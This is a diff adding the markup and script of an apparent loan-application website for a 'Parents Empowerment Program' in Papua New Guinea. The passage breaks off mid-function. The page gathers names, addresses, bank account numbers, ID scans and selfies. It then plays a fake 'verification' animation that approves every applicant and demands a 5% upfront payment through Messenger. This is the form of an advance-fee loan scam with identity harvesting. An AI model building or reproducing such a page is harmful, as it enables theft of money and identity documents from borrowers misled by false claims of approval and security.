+                <div class="logo-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+                        <path d="M9 9c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3zm1.5 6h3c2.21 0 4 1.79 4 4H5.5c0-2.21 1.79-4 4-4z"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="logo-text">PEP</div>
+                    <div class="tagline">Parents Empowerment Program</div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Page 1: Welcome -->
+        <div id="page1" class="page active">
+            <div class="hero">
+                <div class="hero-badge">
+                    <span class="emoji">🚀</span>
+                    Quick Approval • Instant Funding
+                </div>
+                <h1>Turn Your <span>Business Dreams</span> Into Reality</h1>
+                <p class="hero-subtitle">Get the capital your business deserves with our fast, secure, and hassle-free loan application</p>
+                
+                <div class="amount-highlight">
+                    <span class="currency">Up to</span>
+                    PGK 75,000
+                </div>
+
+                <div class="trust-badges">
+                    <div class="trust-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            <polyline points="9,12 11,14 15,10"/>
+                        </svg>
+                        100% Secure
+                    </div>
+                    <div class="trust-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"/>
+                            <polyline points="12,6 12,12 16,14"/>
+                        </svg>
+                        5-Min Process
+                    </div>
+                    <div class="trust-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                            <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
+                            <line x1="1" y1="10" x2="23" y2="10"/>
+                        </svg>
+                        No Hidden Fees
+                    </div>
+                </div>
+
+                <div class="features">
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                                <polyline points="22,4 12,14.01 9,11.01"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <h3>Instant Approval</h3>
+                            <p>Get approved in minutes</p>
+                        </div>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                <line x1="12" y1="1" x2="12" y2="23"/>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <h3>Flexible Repayment</h3>
+                            <p>Choose 6 or 12 months</p>
+                        </div>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
+                                <circle cx="9" cy="7" r="4"/>
+                                <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
+                                <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <h3>1000+ Approved</h3>
+                            <p>Join happy borrowers</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stats-bar">
+                    <div class="stat">
+                        <div class="stat-number" id="statLoans">1,247</div>
+                        <div class="stat-label">Loans Approved</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-number">PGK 45M+</div>
+                        <div class="stat-label">Total Disbursed</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-number">98%</div>
+                        <div class="stat-label">Approval Rate</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-card">
+                <h2 class="form-title">Start Your Application</h2>
+                <p class="form-subtitle">Fill in your details to begin • Takes only 5 minutes</p>
+
+                <div class="progress-container">
+                    <div class="progress-steps">
+                        <div class="progress-line" id="progressLine" style="width: 0%"></div>
+                        <div class="progress-step active" id="step1">1</div>
+                        <div class="progress-step" id="step2">2</div>
+                        <div class="progress-step" id="step3">3</div>
+                    </div>
+                    <div class="progress-labels">
+                        <span class="progress-label active">Personal</span>
+                        <span class="progress-label">Banking</span>
+                        <span class="progress-label">Loan</span>
+                    </div>
+                </div>
+
+                <div id="form1">
+                    <div class="form-section">
+                        <div class="form-section-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                                <circle cx="12" cy="7" r="4"/>
+                            </svg>
+                            Personal Information
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="fullName">Full Name (as on ID)</label>
+                            <input type="text" id="fullName" placeholder="Enter your full legal name">
+                            <div class="error-message" id="fullNameError">Please enter your full name</div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="phone">Phone Number</label>
+                                <input type="tel" id="phone" placeholder="+675 xxx xxxx">
+                                <div class="error-message" id="phoneError">Please enter your phone</div>
+                            </div>
+                            <div class="form-group">
+                                <label for="email">Email Address</label>
+                                <input type="email" id="email" placeholder="you@email.com">
+                                <div class="error-message" id="emailError">Please enter valid email</div>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="address">Home Address</label>
+                            <input type="text" id="address" placeholder="Enter your complete address">
+                            <div class="error-message" id="addressError">Please enter your address</div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="age">Age</label>
+                                <input type="number" id="age" placeholder="Your age" min="18" max="100">
+                                <div class="error-message" id="ageError">Must be 18+</div>
+                            </div>
+                            <div class="form-group">
+                                <label for="relationship">Relationship Status</label>
+                                <select id="relationship">
+                                    <option value="">Select status</option>
+                                    <option value="Single">Single</option>
+                                    <option value="Married">Married</option>
+                                    <option value="Divorced">Divorced</option>
+                                    <option value="Widowed">Widowed</option>
+                                </select>
+                                <div class="error-message" id="relationshipError">Please select</div>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="occupation">Occupation / Business</label>
+                            <input type="text" id="occupation" placeholder="What do you do for a living?">
+                            <div class="error-message" id="occupationError">Please enter occupation</div>
+                        </div>
+                    </div>
+
+                    <button type="button" class="btn btn-primary" id="continueBtn1">Continue to Banking Details →</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 2: Banking Details -->
+        <div id="page2" class="page">
+            <div class="form-card" style="margin-top: 20px;">
+                <h2 class="form-title">Banking Details</h2>
+                <p class="form-subtitle">Where should we deposit your approved loan?</p>
+
+                <div class="progress-container">
+                    <div class="progress-steps">
+                        <div class="progress-line" style="width: 50%"></div>
+                        <div class="progress-step completed">✓</div>
+                        <div class="progress-step active">2</div>
+                        <div class="progress-step">3</div>
+                    </div>
+                    <div class="progress-labels">
+                        <span class="progress-label">Personal</span>
+                        <span class="progress-label active">Banking</span>
+                        <span class="progress-label">Loan</span>
+                    </div>
+                </div>
+
+                <div id="form2">
+                    <div class="form-section">
+                        <div class="form-section-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
+                                <line x1="1" y1="10" x2="23" y2="10"/>
+                            </svg>
+                            Bank Account Information
+                        </div>
+
+                        <div class="form-group">
+                            <label for="accountName">Account Holder Name</label>
+                            <input type="text" id="accountName" placeholder="Name on bank account">
+                            <div class="error-message" id="accountNameError">Please enter account name</div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="bankName">Bank Name</label>
+                            <select id="bankName">
+                                <option value="">Select your bank</option>
+                                <option value="BSP">Bank South Pacific (BSP)</option>
+                                <option value="Westpac">Westpac PNG</option>
+                                <option value="Kina Bank">Kina Bank</option>
+                                <option value="ANZ">ANZ Papua New Guinea</option>
+                                <option value="MiBank">MiBank</option>
+                                <option value="National Development Bank">National Development Bank</option>
+                                <option value="Other">Other Bank</option>
+                            </select>
+                            <div class="error-message" id="bankNameError">Please select bank</div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="accountNumber">Account Number</label>
+                                <input type="text" id="accountNumber" placeholder="Enter account number">
+                                <div class="error-message" id="accountNumberError">Please enter account number</div>
+                            </div>
+                            <div class="form-group">
+                                <label for="bankBranch">Bank Branch</label>
+                                <input type="text" id="bankBranch" placeholder="Branch name/location">
+                                <div class="error-message" id="bankBranchError">Please enter branch</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-outline" id="backBtn1">← Back</button>
+                        <button type="button" class="btn btn-primary" id="continueBtn2">Continue to Loan Details →</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 3: Loan Details -->
+        <div id="page3" class="page">
+            <div class="form-card" style="margin-top: 20px;">
+                <h2 class="form-title">Loan Details</h2>
+                <p class="form-subtitle">Choose your loan amount and repayment plan</p>
+
+                <div class="progress-container">
+                    <div class="progress-steps">
+                        <div class="progress-line" style="width: 100%"></div>
+                        <div class="progress-step completed">✓</div>
+                        <div class="progress-step completed">✓</div>
+                        <div class="progress-step active">3</div>
+                    </div>
+                    <div class="progress-labels">
+                        <span class="progress-label">Personal</span>
+                        <span class="progress-label">Banking</span>
+                        <span class="progress-label active">Loan</span>
+                    </div>
+                </div>
+
+                <div id="form3">
+                    <div class="form-group">
+                        <label>Select Loan Amount</label>
+                        <div class="loan-options">
+                            <div class="loan-option">
+                                <input type="radio" name="loanAmount" id="loan25" value="25000">
+                                <label for="loan25">
+                                    <span class="loan-currency">PGK</span>
+                                    <span class="loan-amount">25,000</span>
+                                </label>
+                            </div>
+                            <div class="loan-option">
+                                <input type="radio" name="loanAmount" id="loan50" value="50000">
+                                <label for="loan50">
+                                    <span class="loan-currency">PGK</span>
+                                    <span class="loan-amount">50,000</span>
+                                </label>
+                            </div>
+                            <div class="loan-option">
+                                <input type="radio" name="loanAmount" id="loan75" value="75000">
+                                <label for="loan75">
+                                    <span class="loan-currency">PGK</span>
+                                    <span class="loan-amount">75,000</span>
+                                </label>
+                            </div>
+                        </div>
+                        <div class="error-message" id="loanAmountError">Please select a loan amount</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="purpose">Purpose of Loan</label>
+                        <select id="purpose">
+                            <option value="">What will you use the loan for?</option>
+                            <option value="Business Expansion">Business Expansion</option>
+                            <option value="Inventory Purchase">Inventory Purchase</option>
+                            <option value="Equipment">Equipment Purchase</option>
+                            <option value="Working Capital">Working Capital</option>
+                            <option value="Marketing">Marketing & Advertising</option>
+                            <option value="Vehicle">Vehicle Purchase</option>
+                            <option value="Property">Property Investment</option>
+                            <option value="Other">Other Purpose</option>
+                        </select>
+                        <div class="error-message" id="purposeError">Please select a purpose</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Repayment Plan</label>
+                        <div class="repayment-options">
+                            <div class="repayment-option">
+                                <input type="radio" name="repayment" id="repay6" value="6">
+                                <label for="repay6">
+                                    <span class="repayment-months">6</span>
+                                    <span class="repayment-label">Months</span>
+                                </label>
+                            </div>
+                            <div class="repayment-option">
+                                <input type="radio" name="repayment" id="repay12" value="12">
+                                <label for="repay12">
+                                    <span class="repayment-months">12</span>
+                                    <span class="repayment-label">Months</span>
+                                </label>
+                            </div>
+                        </div>
+                        <div class="error-message" id="repaymentError">Please select a repayment plan</div>
+                    </div>
+
+                    <div id="monthlyPayment" class="monthly-payment" style="display: none;">
+                        <p>Your Estimated Monthly Payment</p>
+                        <div class="monthly-amount" id="monthlyAmount">PGK 0</div>
+                        <div class="monthly-period" id="monthlyPeriod">per month for 0 months</div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Upload National ID Card</label>
+                            <div class="file-upload" id="idUpload">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                                    <polyline points="17,8 12,3 7,8"/>
+                                    <line x1="12" y1="3" x2="12" y2="15"/>
+                                </svg>
+                                <p>Upload <strong>National ID</strong></p>
+                                <input type="file" id="idCard" accept="image/*,.pdf">
+                            </div>
+                            <div class="error-message" id="idCardError">Please upload ID</div>
+                        </div>
+                        <div class="form-group">
+                            <label>Upload Selfie Photo</label>
+                            <div class="file-upload" id="selfieUpload">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+                                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+                                    <circle cx="12" cy="13" r="4"/>
+                                </svg>
+                                <p>Upload <strong>Selfie</strong></p>
+                                <input type="file" id="selfie" accept="image/*">
+                            </div>
+                            <div class="error-message" id="selfieError">Please upload selfie</div>
+                        </div>
+                    </div>
+
+                    <div class="terms-box">
+                        <h4>Important Terms & Conditions</h4>
+                        <p>
+                            By submitting this application, you confirm that all information provided is accurate and you agree to our 
+                            <span class="highlight">Loan Terms & Privacy Policy</span>. Upon approval, a 
+                            <span class="highlight">5% upfront installment payment</span> is required to process your disbursement. 
+                            This deposit secures your loan and will be applied to your total balance. Please proceed only if you 
+                            accept these terms and are ready to make the initial payment.
+                        </p>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="agreeTerms">
+                            <label for="agreeTerms">I confirm all information is accurate and I agree to the terms of service, loan conditions, and 5% upfront payment requirement.</label>
+                        </div>
+                        <div class="error-message" id="termsError">You must agree to continue</div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-outline" id="backBtn2">← Back</button>
+                        <button type="button" class="btn btn-primary" id="submitBtn">Submit Application</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 4: Loading -->
+        <div id="page4" class="page">
+            <div class="loading-container">
+                <div class="loading-circle">
+                    <svg width="180" height="180">
+                        <defs>
+                            <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                                <stop offset="0%" stop-color="#1a5f4a"/>
+                                <stop offset="50%" stop-color="#e8b923"/>
+                                <stop offset="100%" stop-color="#1a5f4a"/>
+                            </linearGradient>
+                        </defs>
+                        <circle class="bg" cx="90" cy="90" r="80"/>
+                        <circle class="progress" id="progressCircle" cx="90" cy="90" r="80"/>
+                    </svg>
+                    <div class="loading-percentage" id="loadingPercent">0%</div>
+                </div>
+                <div class="loading-text">
+                    <strong id="loadingStatus">Processing your application...</strong>
+                    <span id="loadingSubtext">Please wait while we review your details</span>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step" id="loadStep1">
+                        <div class="loading-step-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="3">
+                                <polyline points="20,6 9,17 4,12"/>
+                            </svg>
+                        </div>
+                        <span>Verifying identity</span>
+                    </div>
+                    <div class="loading-step" id="loadStep2">
+                        <div class="loading-step-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="3">
+                                <polyline points="20,6 9,17 4,12"/>
+                            </svg>
+                        </div>
+                        <span>Analyzing profile</span>
+                    </div>
+                    <div class="loading-step" id="loadStep3">
+                        <div class="loading-step-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="3">
+                                <polyline points="20,6 9,17 4,12"/>
+                            </svg>
+                        </div>
+                        <span>Calculating eligibility</span>
+                    </div>
+                    <div class="loading-step" id="loadStep4">
+                        <div class="loading-step-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke-width="3">
+                                <polyline points="20,6 9,17 4,12"/>
+                            </svg>
+                        </div>
+                        <span>Finalizing approval</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 5: Success -->
+        <div id="page5" class="page">
+            <div id="confettiContainer" class="confetti"></div>
+            <div class="success-container">
+                <div class="success-header">
+                    <div class="success-icon">
+                        <svg viewBox="0 0 24 24" fill="none">
+                            <polyline points="20,6 9,17 4,12"/>
+                        </svg>
+                    </div>
+                    <h2>🎉 Congratulations!</h2>
+                    <p>Your loan application has been approved!</p>
+                </div>
+
+                <div class="approval-card">
+                    <h3>Approved Loan Amount</h3>
+                    <div class="approval-amount" id="approvedAmount">PGK 0</div>
+                    <div class="approval-label">Ready for disbursement</div>
+
+                    <div class="deposit-required">
+                        <p>Required Upfront Payment (5%)</p>
+                        <div class="deposit-amount" id="depositAmount">PGK 0</div>
+                    </div>
+                </div>
+
+                <div class="info-summary">
+                    <h3>📋 Application Summary</h3>
+                    <div class="info-row">
+                        <span class="info-label">Full Name</span>
+                        <span class="info-value" id="summaryName">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Phone</span>
+                        <span class="info-value" id="summaryPhone">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Email</span>
+                        <span class="info-value" id="summaryEmail">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Address</span>
+                        <span class="info-value" id="summaryAddress">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Age</span>
+                        <span class="info-value" id="summaryAge">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Relationship Status</span>
+                        <span class="info-value" id="summaryRelationship">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Occupation</span>
+                        <span class="info-value" id="summaryOccupation">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Bank</span>
+                        <span class="info-value" id="summaryBank">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Account Number</span>
+                        <span class="info-value" id="summaryAccount">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Loan Amount</span>
+                        <span class="info-value" id="summaryLoan">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Purpose</span>
+                        <span class="info-value" id="summaryPurpose">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Repayment Plan</span>
+                        <span class="info-value" id="summaryRepayment">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Monthly Payment</span>
+                        <span class="info-value" id="summaryMonthly">-</span>
+                    </div>
+                </div>
+
+                <div class="cta-section">
+                    <h4>📱 Complete Your Loan Application</h4>
+                    <p>Send our customer service team a message to finalize your loan disbursement and make your 5% upfront payment.</p>
+                    <a href="https://m.me/838746395998915" target="_blank" class="cta-button">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 2C6.477 2 2 6.145 2 11.243c0 2.908 1.438 5.503 3.686 7.2V22l3.3-1.815c.88.245 1.816.378 2.78.378h.234c5.523 0 10-4.145 10-9.243S17.523 2 12 2z"/>
+                        </svg>
+                        Message Us on Messenger
+                    </a>
+                </div>
+
+                <div class="footer-note">
+                    <p>Thank you for choosing <strong>PEP</strong>!<br>
+                    Our team will contact you within 24 hours.<br><br>
+                    <a href="#" id="restartBtn">Start New Application</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY"); // You'll need to replace this with actual EmailJS key
+        })();
+
+        // Store form data
+        var formData = {
+            fullName: '',
+            phone: '',
+            email: '',
+            address: '',
+            age: '',
+            relationship: '',
+            occupation: '',
+            accountName: '',
+            bankName: '',
+            accountNumber: '',
+            bankBranch: '',
+            loanAmount: 0,
+            purpose: '',
+            repayment: 0
+        };
+
+        // Toast notification
+        function showToast(message, type) {
+            var toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + type + ' show';
+            setTimeout(function() {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Page navigation
+        function goToPage(pageNum) {
+            var pages = document.querySelectorAll('.page');
+            for (var i = 0; i < pages.length; i++) {
+                pages[i].classList.remove('active');
+            }
+            document.getElementById('page' + pageNum).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Clear error styling
+        function clearError(fieldId) {
+            var field = document.getElementById(fieldId);
+            var errorMsg = document.getElementById(fieldId + 'Error');
+            if (field) field.classList.remove('error');
+            if (errorMsg) errorMsg.classList.remove('show');
+        }
+
+        // Show error styling
+        function showError(fieldId) {
+            var field = document.getElementById(fieldId);
+            var errorMsg = document.getElementById(fieldId + 'Error');
+            if (field) field.classList.add('error');
+            if (errorMsg) errorMsg.classList.add('show');
+        }
+
+        // Validate email format
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        // Validate Step 1 (Personal Info)
+        function validateStep1() {
+            var isValid = true;
+
+            var fullName = document.getElementById('fullName').value.trim();
+            clearError('fullName');
+            if (!fullName) { showError('fullName'); isValid = false; }
+
+            var phone = document.getElementById('phone').value.trim();
+            clearError('phone');
+            if (!phone) { showError('phone'); isValid = false; }
+
+            var email = document.getElementById('email').value.trim();
+            clearError('email');
+            if (!email || !isValidEmail(email)) { showError('email'); isValid = false; }
+
+            var address = document.getElementById('address').value.trim();
+            clearError('address');
+            if (!address) { showError('address'); isValid = false; }
+
+            var age = document.getElementById('age').value;
+            clearError('age');
+            if (!age || parseInt(age) < 18) { showError('age'); isValid = false; }
+
+            var relationship = document.getElementById('relationship').value;
+            clearError('relationship');
+            if (!relationship) { showError('relationship'); isValid = false; }
+
+            var occupation = document.getElementById('occupation').value.trim();
+            clearError('occupation');
+            if (!occupation) { showError('occupation'); isValid = false; }
+
+            if (isValid) {
+                formData.fullName = fullName;
+                formData.phone = phone;
+                formData.email = email;
+                formData.address = address;
+                formData.age = age;
+                formData.relationship = relationship;
+                formData.occupation = occupation;
+                goToPage(2);
+            } else {
+                showToast('Please fill in all required fields', 'error');
+            }
+        }
+
+        // Validate Step 2 (Banking Info)
+        function validateStep2() {
+            var isValid = true;
+
+            var accountName = document.getElementById('accountName').value.trim();
+            clearError('accountName');
+            if (!accountName) { showError('accountName'); isValid = false; }
+
+            var bankName = document.getElementById('bankName').value;
+            clearError('bankName');
+            if (!bankName) { showError('bankName'); isValid = false; }
+
+            var accountNumber = document.getElementById('accountNumber').value.trim();
+            clearError('accountNumber');
+            if (!accountNumber) { showError('accountNumber'); isValid = false; }
+
+            var bankBranch = document.getElementById('bankBranch').value.trim();
+            clearError('bankBranch');
+            if (!bankBranch) { showError('bankBranch'); isValid = false; }
+
+            if (isValid) {
+                formData.accountName = accountName;
+                formData.bankName = bankName;
+                formData.accountNumber = accountNumber;
+                formData.bankBranch = bankBranch;
+                goToPage(3);
+            } else {
+                showToast('Please fill in all banking details', 'error');
+            }
+        }
+
+        // Calculate monthly payment
+        function calculateMonthlyPayment() {
+            var loanInput = document.querySelector('input[name="loanAmount"]:checked');
+            var repayInput = document.querySelector('input[name="repayment"]:checked');
+            
+            if (loanInput && repayInput) {
+                var loan = parseInt(loanInput.value);
+                var months = parseInt(repayInput.value);
+                var monthly = Math.round(loan / months);
+                
+                document.getElementById('monthlyPayment').style.display = 'block';
+                document.getElementById('monthlyAmount').textContent = 'PGK ' + monthly.toLocaleString();
+                document.getElementById('monthlyPeriod').textContent = 'per month for ' + months + ' months';
+                
+                formData.loanAmount = loan;
+                formData.repayment = months;
+            }
+        }
+
+        // Send email via EmailJS or mailto fallback
+        function sendEmail(callback) {
+            var monthly = Math.round(formData.loanAmount / formData.repayment);
+            var deposit = Math.round(formData.loanAmount * 0.05);
+            
+            var emailBody = 
+                "=== NEW LOAN APPLICATION ===%0D%0A%0D%0A" +
+                "PERSONAL INFORMATION%0D%0A" +
+                "Full Name: " + formData.fullName + "%0D%0A" +
+                "Phone: " + formData.phone + "%0D%0A" +
+                "Email: " + formData.email + "%0D%0A" +
+                "Address: " + formData.address + "%0D%0A" +
+                "Age: " + formData.age + " years%0D%0A" +
+                "Relationship Status: " + formData.relationship + "%0D%0A" +
+                "Occupation: " + formData.occupation + "%0D%0A%0D%0A" +
+                
+                "BANKING DETAILS%0D%0A" +
+                "Account Name: " + formData.accountName + "%0D%0A" +
+                "Bank: " + formData.bankName + "%0D%0A" +
+                "Account Number: " + formData.accountNumber + "%0D%0A" +
+                "Branch: " + formData.bankBranch + "%0D%0A%0D%0A" +
+                
+                "LOAN DETAILS%0D%0A" +
+                "Loan Amount: PGK " + formData.loanAmount.toLocaleString() + "%0D%0A" +
+                "Purpose: " + formData.purpose + "%0D%0A" +
+                "Repayment Plan: " + formData.repayment + " months%0D%0A" +
+                "Monthly Payment: PGK " + monthly.toLocaleString() + "%0D%0A" +
+                "5% Deposit Required: PGK " + deposit.toLocaleString() + "%0D%0A%0D%0A" +
+                
+                "Application submitted on: " + new Date().toLocaleString();
+
+            // Create mailto link and trigger
+            var mailtoLink = "mailto:parentsempowermentprogram@gmail.com" +
+                "?subject=New Loan Application - " + formData.fullName +
+                "&body=" + emailBody;
+            
+            // Open mailto in a new window/tab
+            var emailWindow = window.open(mailtoLink, '_blank');
+            
+            // Continue regardless (the email client will handle it)
+            if (callback) callback();
+        }
+
+        // Validate and submit final form
+        function validateAndSubmit() {
+            var isValid = true;
+
+            var loanInput = document.querySelector('input[name="loanAmount"]:checked');
+            document.getElementById('loanAmountError').classList.remove('show');
+            if (!loanInput) {
+                document.getElementById('loanAmountError').classList.add('show');
+                isValid = false;
+            }
+
+            var purpose = document.getElementById('purpose').value;
+            clearError('purpose');
+            if (!purpose) { showError('purpose'); isValid = false; }
+
+            var repayInput = document.querySelector('input[name="repayment"]:checked');
+            document.getElementById('repaymentError').classList.remove('show');
+            if (!repayInput) {
+                document.getElementById('repaymentError').classList.add('show');
+                isValid = false;
+            }
+
+            var idCard = document.getElementById('idCard').files;
+            document.getElementById('idCardError').classList.remove('show');
+            if (idCard.length === 0) {
+                document.getElementById('idCardError').classList.add('show');
+                isValid = false;
+            }
+
+            var selfie = document.getElementById('selfie').files;
+            document.getElementById('selfieError').classList.remove('show');
+            if (selfie.length === 0) {
+                document.getElementById('selfieError').classList.add('show');
+                isValid = false;
+            }
+
+            var agreeTerms = document.getElementById('agreeTerms').checked;
+            document.getElementById('termsError').classList.remove('show');
+            if (!agreeTerms) {
+                document.getElementById('termsError').classList.add('show');
+                isValid = false;
+            }
+
+            if (isValid) {
+                formData.purpose = purpose;
+                formData.loanAmount = parseInt(loanInput.value);
+                formData.repayment = parseInt(repayInput.value);
+                
+                // Send email first, then show loading
+                sendEmail(function() {
+                    goToPage(4);
+                    startLoading();
+                });
+            } else {
+                showToast('Please complete all required fields', 'error');
+            }
+        }
+
+        // Loading animation
+        function startLoading() {
+            var progress = 0;
+            var circle = document.getElementById('progressCircle');
+            var percentText = document.getElementById('loadingPercent');
+            var statusText = document.getElementById('loadingStatus');
+            var subText = document.getElementById('loadingSubtext');
+            var circumference = 2 * Math.PI * 80;
+            
+            var steps = [
+                { percent: 25, step: 1, status: 'Verifying your identity...', sub: 'Checking uploaded documents' },
+                { percent: 50, step: 2, status: 'Analyzing your profile...', sub: 'Reviewing your information' },
+                { percent: 75, step: 3, status: 'Calculating loan eligibility...', sub: 'Almost there!' },
+                { percent: 95, step: 4, status: 'Finalizing approval...', sub: 'Preparing your results' }
+            ];
+            
+            var interval = setInterval(function() {
+                progress += Math.random() * 2 + 0.5;
+                if (progress > 100) progress = 100;
+                
+                var offset = circumference - (progress / 100 * circumference);
+                circle.style.strokeDashoffset = offset;
+                percentText.textContent = Math.round(progress) + '%';
+                
+                // Update steps
+                for (var i = 0; i < steps.length; i++) {
+                    var step = steps[i];
+                    var stepEl = document.getElementById('loadStep' + step.step);
+                    
+                    if (progress >= step.percent) {
+                        if (i < steps.length - 1 && progress >= steps[i + 1].percent) {
+                            stepEl.classList.remove('active');
+                            stepEl.classList.add('completed');
+                        } else {
+                            stepEl.classList.add('active');
+                            statusText.textContent = step.status;
+                            subText.textContent = step.sub;
+                        }
+                    }
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('loadStep4').classList.remove('active');
+                    document.getElementById('loadStep4').classList.add('completed');
+                    statusText.textContent = 'Application Approved! 🎉';
+                    subText.textContent = 'Redirecting to your results...';
+                    
+                    setTimeout(function() {
+                        showSuccess();
+                    }, 1000);
+                }
+            }, 60);
+        }
+
+        // Create confetti
+        function createConfetti() {
+            var container = document.getElementById('confettiContainer');
+            var colors = ['#1a5f4a', '#e8b923', '#2d8a6e', '#f5d45a', '#0f3d2f'];
+            
+            for (var i = 0; i < 50; i++) {
+                var confetti = document.createElement('div');
+                confetti.className = 'confetti-piece';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                container.appendChild(confetti);
+            }
+            
+            setTimeout(function() {
+                container.innerHTML = '';
+            }, 5000);
+        }
+
+        // Show success page
+        function showSuccess() {
+            var loanAmount = formData.loanAmount;
+            var deposit = Math.round(loanAmount * 0.05);
+            var monthly = Math.round(loanAmount / formData.repayment);
+            
+            document.getElementById('approvedAmount').textContent = 'PGK ' + loanAmount.toLocaleString();
+            document.getElementById('depositAmount').textContent = 'PGK ' + deposit.toLocaleString();
+            
+            document.getElementById('summaryName').textContent = formData.fullName;
+            document.getElementById('summaryPhone').textContent = formData.phone;
+            document.getElementById('summaryEmail').textContent = formData.email;
+            document.getElementById('summaryAddress').textContent = formData.address;
+            document.getElementById('summaryAge').textContent = formData.age + ' years old';
+            document.getElementById('summaryRelationship').textContent = formData.relationship;
+            document.getElementById('summaryOccupation').textContent = formData.occupation;
+            document.getElementById('summaryBank').textContent = formData.bankName + ' - ' + formData.bankBranch;
